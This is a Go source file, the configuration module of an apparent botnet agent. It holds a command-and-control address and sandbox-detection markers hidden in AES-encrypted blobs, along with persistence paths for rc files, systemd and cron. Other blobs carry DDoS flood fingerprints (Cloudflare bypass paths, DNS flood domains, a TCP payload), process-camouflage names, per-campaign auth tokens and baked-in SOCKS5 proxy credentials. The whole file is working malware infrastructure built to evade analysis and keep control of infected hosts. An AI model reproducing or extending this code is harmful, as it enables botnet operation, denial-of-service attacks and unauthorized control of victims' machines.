package main

import (
	"encoding/hex"
	"strings"
	"time"
)

// ============================================================================
// CONFIGURATION
// All tuneable constants and variables live here. setup.py updates this file.
// ============================================================================

// verboseLog enables verbose logging to stdout (set false for production).
var verboseLog = true

// --- Service connection ---

// serviceAddr holds the resolved service address, decoded at runtime from rawServiceAddr.
var serviceAddr string

// configSeed is the 8-char hex seed used for key derivation.
const configSeed = "d5a04136" //change me run setup.py

// syncToken is the shared auth token — must match server.
const syncToken = "c0QfIab3^u#7YaJn" //change this per campaign

// buildTag must match the server's version string.
const buildTag = "V2_2" //change this per campaign

// retryFloor and retryCeil define the range for randomised reconnection delays.
var retryFloor = 4 * time.Second
var retryCeil = 7 * time.Second

// --- Proxy ---

// proxyUser and proxyPass gate the SOCKS5 proxy interface.
// Default credentials are baked in at build time by setup.py.
// Can be overridden at runtime via !socksauth command.
// Protected by socksCredsMutex for concurrent read/write safety.
var proxyUser = "S2OvSHWuCMeK"    //change me run setup.py
var proxyPass = "wRvQdo36s2J8"    //change me run setup.py

// maxSessions caps concurrent proxy connections.
var maxSessions int32 = 100

// --- Misc ---

// workerPool is the default number of concurrent workers.
var workerPool = 2024

// bufferCap is the standard buffer size for I/O operations.
const bufferCap = 256

// ============================================================================
// RUNTIME DATA (AES-128-CTR)
// No plaintext in the binary. Decoded at runtime by initRuntimeConfig().
// setup.py generates a random key per build and re-encrypts all blobs.
// Re-generate with: python3 setup.py
// ============================================================================

// Runtime-decoded values (populated by initRuntimeConfig before use)
var (
	// Sandbox / analysis detection
	sysMarkers   []string
	procFilters  []string
	parentChecks []string

	// Persistence paths
	rcTarget    string
	storeDir    string
	binLabel    string
	unitPath    string
	unitName    string
	schedExpr   string
	envLabel    string
	cacheLoc    string
	lockLoc     string

	// Protocol strings
	protoChallenge  string
	protoSuccess    string
	protoRegFmt     string
	protoPing       string
	protoPong       string
	protoOutFmt     string
	protoErrFmt     string
	protoStdoutFmt  string
	protoStderrFmt  string
	protoExitErrFmt string
	protoExitOk     string
	protoInfoFmt    string

	// Response messages
	msgStreamStart  string
	msgBgStart      string
	msgPersistStart string
	msgKillAck      string
	msgSocksErrFmt  string
	msgSocksStartFmt string
	msgSocksStop    string
	msgSocksAuthFmt string

	// DNS / URL infrastructure
	dohServers    []string
	dohFallback   []string
	dohAttack     []string
	resolverPool  []string
	speedTestURL  string
	dnsJsonAccept string

	// Attack fingerprints
	shortUAs        []string
	refererList     []string
	httpPaths       []string
	cfPaths         []string
	cfCookieName    string
	tcpPayload      string
	dnsFloodDomains []string
	alpnH2          string

	// System / camouflage
	camoNames      []string
	shellBin       string
	shellFlag      string
	procPrefix     string
	cmdlineSuffix  string
	pgrepBin       string
	pgrepFlag      string
	devNullPath    string
	systemctlBin   string
	crontabBin     string
	bashBin        string
)

// --- Raw blobs (IV+ciphertext, AES-128-CTR, key = XOR byte functions in opsec.go) ---
// @encrypt:single — setup.py uses these tags to identify vars for re-encryption

var rawServiceAddr, _ = hex.DecodeString("2c19a776bc35bb524523fd479ca2fadbce4122e0847da0e1021a38d1aeeba9cd270304a4e7fe30d3cf2ad3de3ad4238f8e4ef5cc0fc56d943d359631c1495fc6288c327c7a144f8f") //change me run setup.py

// @encrypt:slice sysMarkers
var rawSysMarkers, _ = hex.DecodeString("5b71ba43473a98c2887d20f6d5421e831bcf2d45880568269eea70e9084e2731e6545bd61c08dc89184e9ff497c604b0baeefab789986abea4fb7382645fb3519821d61919d0cdfc6f9a1fa4435ac28a7cbfd2e8aaaf8c34e63ac5f8421e9fe03a1cbb34f63b239b803b93f48d39f784823a4f274f")
// @encrypt:slice procFilters
var rawProcFilters, _ = hex.DecodeString("c1b112572312b565942c0528e67b8baf69d8dd2f1293571cf9e1ec09a1bbdeb1c6778afa8830462f3bb687c8bc948d7757873f50319126029b63ec4fdde639914db47d20e8199e2e7962")
// @encrypt:slice parentChecks
var rawParentChecks, _ = hex.DecodeString("99a1604a6e4e585f90cfdc608cb37fb385cd37c3988b961b4d1a0a5911a174ab")

// @encrypt:single rcTarget
var rawRcTarget, _ = hex.DecodeString("d8caa52729a086786990fc7326c24d6157186f0240e375f96bd0e24a00")
// @encrypt:single storeDir
var rawStoreDir, _ = hex.DecodeString("5216eb5c1d2f1476240cfa6c2a85364118ba83de76ac4104005e0a3bbddc2b573f20690b0d")
// @encrypt:single binLabel
var rawBinLabel, _ = hex.DecodeString("d80a92bb7d446142365a1fbbf8d50ce9012cf25909157b3dc8e35646dd")
// @encrypt:single unitPath
var rawUnitPath, _ = hex.DecodeString("b37758b3214114032e8283e6af6fce4de339870d0af73a5932ff3513c08c7626f770a735e57b60d760e58af83a869cf22b0acec0676b42")
// @encrypt:single unitName
var rawUnitName, _ = hex.DecodeString("6c47640688879ed75330ef646dcd2eb3076beee9d5d2dcfcf1e74cef19c8c6c1efa305")
// @encrypt:single schedExpr
var rawSchedExpr, _ = hex.DecodeString("a7d741f8625faf608b377181250435889358a797cab5854de4")

// @encrypt:single envLabel
var rawEnvLabel, _ = hex.DecodeString("10d7510da10476e0a0c9a80af703b92b528abd721a0a83583dfb44e1d1")
// @encrypt:single cacheLoc
var rawCacheLoc, _ = hex.DecodeString("0d0fc9430bf6dca7e12c6dc5042142f5ebaa0b87c103c9c238211d0eda3dca2413a1ea0df20bc2")
// @encrypt:single lockLoc
var rawLockLoc, _ = hex.DecodeString("c3dc8680ef1e7d4d6583dbd85ea824facee2bea9511664a8ef44b8ae0464d0b8727320005fa5465222b263")

// --- Protocol blobs ---

// @encrypt:single protoChallenge
var rawProtoChallenge, _ = hex.DecodeString("8be211c29c31a63939d79e274c080745e75f759c1b09a3354af729afc3d0a1")
// @encrypt:single protoSuccess
var rawProtoSuccess, _ = hex.DecodeString("35a51716b42c174dee616dc1f202ef18f1deea87344f9259206e73b1")
// @encrypt:single protoRegFmt
var rawProtoRegFmt, _ = hex.DecodeString("59a39caea72f8bc8b4e72f29b77cfc8a33785567f54eb9e1e4cf8f5a53b9d895bb81a615d3783d448abe29d5afb6f2a2")
// @encrypt:single protoPing
var rawProtoPing, _ = hex.DecodeString("1d186bfd80b8d00f535074a25cabae4fd0ee4a1f")
// @encrypt:single protoPong
var rawProtoPong, _ = hex.DecodeString("9cf90a56c2d1d1c9815b9bc36affbf066ba3f9cd10")
// @encrypt:single protoOutFmt
var rawProtoOutFmt, _ = hex.DecodeString("c72c893f789ef787f8537e643d930f75fdba5ef57a376938221f18d959728c")
// @encrypt:single protoErrFmt
var rawProtoErrFmt, _ = hex.DecodeString("0014822a9887fb0286fa14f76bea8e3cad67f57492687d619e41")
// @encrypt:single protoStdoutFmt
var rawProtoStdoutFmt, _ = hex.DecodeString("5b608b55ff5f58e20d55349465949bf0708e9f0f41a2424e725ddc")
// @encrypt:single protoStderrFmt
var rawProtoStderrFmt, _ = hex.DecodeString("3a252a39188405ac4ce4921debc83c002f0b515574b6ebe24098f6")
// @encrypt:single protoExitErrFmt
var rawProtoExitErrFmt, _ = hex.DecodeString("043ccc2cac11af2c8405e53c75076283bd27c109424b9cb70812139d8045e6")
// @encrypt:single protoExitOk
var rawProtoExitOk, _ = hex.DecodeString("94aea7b106530ec5089f9ab2479faeced60f76d93868aa5e0cd8d1a5238710cbd25a6762a5a737d6b3b2ba2d46032f0ce67cccb8a7")
// @encrypt:single protoInfoFmt
var rawProtoInfoFmt, _ = hex.DecodeString("e9099d418d2644c8cb1b0ccbb317474c58037a0bfe46281d94")

// --- Response message blobs ---

// @encrypt:single msgStreamStart
var rawMsgStreamStart, _ = hex.DecodeString("f5dcd4c77858c336fb25cc99200debd81c325ff905a9d05c813094372fe1511c0856")
// @encrypt:single msgBgStart
var rawMsgBgStart, _ = hex.DecodeString("2e53b4e9a39f267d8a3e7057b9d8a8ac5f39fa1d1305fde1ba04a1f1846320efca2ed9f0f2d8296e3e154dde42b6")
// @encrypt:single msgPersistStart
var rawMsgPersistStart, _ = hex.DecodeString("32c7bf3e660c9ca4d0ab81ae74b3fc5d83a8f6263eadde00ce3e6ab2baf7e5aee14c059833ac44ccc579a297")
// @encrypt:single msgKillAck
var rawMsgKillAck, _ = hex.DecodeString("06a55e434b5cebcb9d67d01c71da9f3cacc25030eae4a6f3c766afdb616abf124f6937bbfe1f075a6936e3fdcf2c6e672f43e6651a4e59748c96")
// @encrypt:single msgSocksErrFmt
var rawMsgSocksErrFmt, _ = hex.DecodeString("9f769679e62e9e552d860e87b7cb8e6c2efff976ccbb5b76fa8be91f69a43fed")
// @encrypt:single msgSocksStartFmt
var rawMsgSocksStartFmt, _ = hex.DecodeString("07ff5cbd459ce29d0f8c826e6030b7fd8c0a35b2daec67e3f5eea6caa51c6b3f7d1df2798eadc5ea11055773bd810b75")
// @encrypt:single msgSocksStop
var rawMsgSocksStop, _ = hex.DecodeString("cb9fc8ad8a73fd293cefbfa5ee15c4f333b4d7ed89a3edf225d1cdd6567c869b688bdb4d5c")
// @encrypt:single msgSocksAuthFmt
var rawMsgSocksAuthFmt, _ = hex.DecodeString("8d5dc819d4c1ca396e325fd643f32330e09dbdc03f353cc82de56f0f4c9802c4f939bbf0f4d96a21099928dc8f2656")

// --- DNS / URL infrastructure blobs ---

// @encrypt:slice dohServers
var rawDohServers, _ = hex.DecodeString("6ae5381ac16bf7b1d1512b68e864176a2ac212d64fe5304c9cedf9a3f883763755e34c2d1c33d47e624270a05e0b6930b24ba082c9ee1e2eca07b042cc0d0df0241ba8c5fab4ea41598e96cd20d311bb77eeb63da690afdf392e0a02c49f8ef6bae3b03e19426f9add168021113d3fd4bf")
// @encrypt:slice dohFallback
var rawDohFallback, _ = hex.DecodeString("d4588a75057e9ed205344fc2063c9850059bcb3a3196d02b23666dc05ab06263f1e20d3dc6e89be14505a94e6e018fb2ff8975fe6e96a201c0baf1338cbdf9d9b9770998c292eb58648facc23f64abe0d2")
// @encrypt:slice dohAttack
var rawDohAttack, _ = hex.DecodeString("8573ca171c6be8975b563c3b87f2a2bc5c85d502208399899e36b1322e59769ba1cb12ea0043c87d11fbe340de2663f740d2bc898e2fe8bbf1677b0d89e9b6caf374da1cdc1a016b3617e6942414")
// @encrypt:slice resolverPool
var rawResolverPool, _ = hex.DecodeString("6aea142825659eb8f0d72e0226cd100b50d255045eba7631ca2639fa211f7b6dbe863af3d0908ad7f1b79d1efe674e96416c5773c8dfb980342023a6b8b3a23cda3666e37b6c6140280c71175f")
// @encrypt:single speedTestURL
var rawSpeedTestURL, _ = hex.DecodeString("b78b3e2e18ca3709341522bca558c755b59c730227e52c98f0c5cfac36eb7b12ea37352297c81ed768ca132bc1dd91ccc683957891dab27f257222e467cfd2")
// @encrypt:single dnsJsonAccept
var rawDnsJsonAccept, _ = hex.DecodeString("225a4114aaf1a3d5379867696bbe822051c630fb6b999f26f69e8b9174bc08f1a52f6262")

// --- Attack fingerprint blobs ---

// @encrypt:slice shortUAs
var rawShortUAs, _ = hex.DecodeString("3869086f3d43fed1f530b7d27ef9799020243e115c1881fed483c6ad72032acc19da9e5c3f71925bec05b3075d1f7a629a2ed3d6069df22d502c156771eb54b4d1d1b8a38e8342b2d3eca09c90f5623d94d132456c3c5790af6b50ca66706fcb2bdebbae12dbf4a99341f140e1c15e8ddc2660b109003af302a043f6d2ebfb0e1ce1992e56c5b4780007669c5f8542d62c39aba9d363a5d170c7789182185e2e8acdf0158ea8cdf292968748e809b414436ef3c0292b975cf42379202daf33d1af3758669f1b0a4776fee91585f5215fcc2f3e1b139094152f48d7ef4d")
// @encrypt:slice refererList
var rawRefererList, _ = hex.DecodeString("ddf43b8f0f36e3b4833bd70ed4d55d9f28f94a3afc269655716a0f5e0af014bcae764ad49e89913e825b7528957d18897b9c4ee5c79f219bcc99867f706f4cd6ee4c5bfb0fa620d6892ab95ddce00518005a434cbd1d86fe576057")
// @encrypt:slice httpPaths
var rawHttpPaths, _ = hex.DecodeString("6d8c5f4fef812957482f282f76ffccfa40a80761f5b5a0e3a160067556e446f38688d22fd2b4d766eaf74c111e8ee971403c5d5ea04fa3d55dfa2f")
// @encrypt:slice cfPaths
var rawCfPaths, _ = hex.DecodeString("27ce92ecfbc67c6203a5c850af2ffa4f24fea8766d68579ca17cd73a8987ca47e87c8d941df3826613d1496e63e7912ce729f03fef7331c530d5e1e6230a9ebb437dfb6163a1f9eb51")
// @encrypt:single cfCookieName
var rawCfCookieName, _ = hex.DecodeString("6316c158e1ad1c3e8c632632a853602d4df27198dcf5ca")
// @encrypt:single tcpPayload
var rawTcpPayload, _ = hex.DecodeString("cde1b288a568c23f85a78d716226ba73f1e74064dc903e832186cb8d667e0abb0cbb")
// @encrypt:slice dnsFloodDomains
var rawDnsFloodDomains, _ = hex.DecodeString("1df1a9397a92fab13f581f90515d722f84a997cd334734ee67f8f7380f6362cc0e9d7a864695118783e6d6b11f5ee1d73557b04c0f11360c5eb549d36e10fea17718732f1261badd72f723070b8123122c073abe4c016d302c7a9fd594fcea")
// @encrypt:single alpnH2
var rawAlpnH2, _ = hex.DecodeString("c0dd95b4422521a81a106130617651fae009")

// --- System / camouflage blobs ---

// @encrypt:slice camoNames
var rawCamoNames, _ = hex.DecodeString("a145f8f0a57055a5313b47223b9f6d6d9fbc00fcba3f26b852436a9dd477b91b83cab6a7fa11c91302911f12c5d8728dabf77df057")
// @encrypt:single shellBin
var rawShellBin, _ = hex.DecodeString("6feada59b085117af71714243489f2d56cdb")
// @encrypt:single shellFlag
var rawShellFlag, _ = hex.DecodeString("d930c2b8c0e846fcaab323a83123f30dcce9")
// @encrypt:single procPrefix
var rawProcPrefix, _ = hex.DecodeString("99ca89de800fe7a66bd53e79e8666803324781238587")
// @encrypt:single cmdlineSuffix
var rawCmdlineSuffix, _ = hex.DecodeString("e48b162b642bb23acb2004adfb87574ee59611fde4f6f934")
// @encrypt:single pgrepBin
var rawPgrepBin, _ = hex.DecodeString("f9177781067bbb9f4992609faff5905172c14b8122")
// @encrypt:single pgrepFlag
var rawPgrepFlag, _ = hex.DecodeString("f90b17e6016b50041acb34936b2829e8fea0")
// @encrypt:single devNullPath
var rawDevNullPath, _ = hex.DecodeString("7379055bce5e501cd82e7c2d30ddc2a868d66092ca19232895")
// @encrypt:single systemctlBin
var rawSystemctlBin, _ = hex.DecodeString("7a80f6f76abbd1943733ac304c25dcaa8ee0e824b706d81e21")
// @encrypt:single crontabBin
var rawCrontabBin, _ = hex.DecodeString("8db392aede3e1c8a5862b6ee967b456c37fe5c89ebfa37")
// @encrypt:single bashBin
var rawBashBin, _ = hex.DecodeString("9ca32614405fc88b0e2ce785cc87734f00eb5a71")

// initRuntimeConfig decodes all raw blobs into their runtime variables.
// Must be called once at startup before any code references these values.
func initRuntimeConfig() {
	// Service address (AES layer wrapping the 5-layer obfuscation)
	serviceAddr = string(garuda(rawServiceAddr))

	// Slice values (null-byte separated)
	sysMarkers = strings.Split(string(garuda(rawSysMarkers)), "\x00")
	procFilters = strings.Split(string(garuda(rawProcFilters)), "\x00")
	parentChecks = strings.Split(string(garuda(rawParentChecks)), "\x00")
	resolverPool = strings.Split(string(garuda(rawResolverPool)), "\x00")
	dohServers = strings.Split(string(garuda(rawDohServers)), "\x00")
	dohFallback = strings.Split(string(garuda(rawDohFallback)), "\x00")
	dohAttack = strings.Split(string(garuda(rawDohAttack)), "\x00")
	shortUAs = strings.Split(string(garuda(rawShortUAs)), "\x00")
	refererList = strings.Split(string(garuda(rawRefererList)), "\x00")
	httpPaths = strings.Split(string(garuda(rawHttpPaths)), "\x00")
	cfPaths = strings.Split(string(garuda(rawCfPaths)), "\x00")
	dnsFloodDomains = strings.Split(string(garuda(rawDnsFloodDomains)), "\x00")
	camoNames = strings.Split(string(garuda(rawCamoNames)), "\x00")

	// Persistence paths
	rcTarget = string(garuda(rawRcTarget))
	storeDir = string(garuda(rawStoreDir))
	binLabel = string(garuda(rawBinLabel))
	unitPath = string(garuda(rawUnitPath))
	unitName = string(garuda(rawUnitName))
	schedExpr = string(garuda(rawSchedExpr))
	envLabel = string(garuda(rawEnvLabel))
	cacheLoc = string(garuda(rawCacheLoc))
	lockLoc = string(garuda(rawLockLoc))

	// Protocol strings
	protoChallenge = string(garuda(rawProtoChallenge))
	protoSuccess = string(garuda(rawProtoSuccess))
	protoRegFmt = string(garuda(rawProtoRegFmt))
	protoPing = string(garuda(rawProtoPing))
	protoPong = string(garuda(rawProtoPong))
	protoOutFmt = string(garuda(rawProtoOutFmt))
	protoErrFmt = string(garuda(rawProtoErrFmt))
	protoStdoutFmt = string(garuda(rawProtoStdoutFmt))
	protoStderrFmt = string(garuda(rawProtoStderrFmt))
	protoExitErrFmt = string(garuda(rawProtoExitErrFmt))
	protoExitOk = string(garuda(rawProtoExitOk))
	protoInfoFmt = string(garuda(rawProtoInfoFmt))

	// Response messages
	msgStreamStart = string(garuda(rawMsgStreamStart))
	msgBgStart = string(garuda(rawMsgBgStart))
	msgPersistStart = string(garuda(rawMsgPersistStart))
	msgKillAck = string(garuda(rawMsgKillAck))
	msgSocksErrFmt = string(garuda(rawMsgSocksErrFmt))
	msgSocksStartFmt = string(garuda(rawMsgSocksStartFmt))
	msgSocksStop = string(garuda(rawMsgSocksStop))
	msgSocksAuthFmt = string(garuda(rawMsgSocksAuthFmt))

	// DNS / URL infrastructure
	speedTestURL = string(garuda(rawSpeedTestURL))
	dnsJsonAccept = string(garuda(rawDnsJsonAccept))

	// Attack fingerprints
	cfCookieName = string(garuda(rawCfCookieName))
	tcpPayload = string(garuda(rawTcpPayload))
	alpnH2 = string(garuda(rawAlpnH2))

	// System / camouflage
	shellBin = string(garuda(rawShellBin))
	shellFlag = string(garuda(rawShellFlag))
	procPrefix = string(garuda(rawProcPrefix))
	cmdlineSuffix = string(garuda(rawCmdlineSuffix))
	pgrepBin = string(garuda(rawPgrepBin))
	pgrepFlag = string(garuda(rawPgrepFlag))
	devNullPath = string(garuda(rawDevNullPath))
	systemctlBin = string(garuda(rawSystemctlBin))
	crontabBin = string(garuda(rawCrontabBin))
	bashBin = string(garuda(rawBashBin))
}
